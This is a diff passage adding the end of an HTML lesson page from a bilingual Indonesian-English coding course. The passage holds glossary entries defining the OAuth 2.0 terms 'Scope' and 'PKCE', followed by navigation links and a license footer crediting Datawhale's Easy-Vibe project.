+<tr><td><b>Scope</b></td><td>-</td><td><b>Permission Scope</b>. An OAuth 2.0 concept representing the permissions requested by a third-party application (e.g., read user information).</td></tr>
+<tr><td><b>PKCE</b></td><td>Proof Key for Code Exchange</td><td><b>Proof Key for Code Exchange</b>. An OAuth 2.0 extension for security hardening of public clients (e.g., SPAs).</td></tr>
+</table></div>
+
+
+    <div class="pager" style="margin-top:54px">
+      <a href="../../4-server-and-backend/async-task-queues/"><span class="dir">← <span lang="id">Sebelumnya</span><span lang="en">Previous</span></span><b><span lang="id">4-server-and-backend/async-task-queues</span><span lang="en">4-server-and-backend/async-task-queues</span></b></a>
+      <a class="next" href="../../4-server-and-backend/backend-languages/"><span class="dir"><span lang="id">Selanjutnya</span><span lang="en">Next</span> →</span><b><span lang="id">4-server-and-backend/backend-languages</span><span lang="en">4-server-and-backend/backend-languages</span></b></a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="license-box">
+      <span lang="id">📜 Materi pembelajaran ini disadur dari proyek terbuka <a href="https://github.com/datawhalechina/easy-vibe" target="_blank" rel="noopener">Easy-Vibe oleh Datawhale</a> (<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>). Ditulis ulang &amp; disajikan secara lokal, independen, dan bilingual oleh VibeKoding.</span>
+      <span lang="en">📜 This educational module is adapted from the open-source project <a href="https://github.com/datawhalechina/easy-vibe" target="_blank" rel="noopener">Easy-Vibe by Datawhale</a> (<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>). Rewritten &amp; hosted locally, independently, and bilingually by VibeKoding.</span>
+    </div>
+    <p class="small" style="margin-top:20px;text-align:center">© 2026 Arif Widiyanto · VibeKoding</p>
+  </div>
+</footer>
+
+<script src="../../../assets/vibekoding.js"></script>
+</body>
+</html>
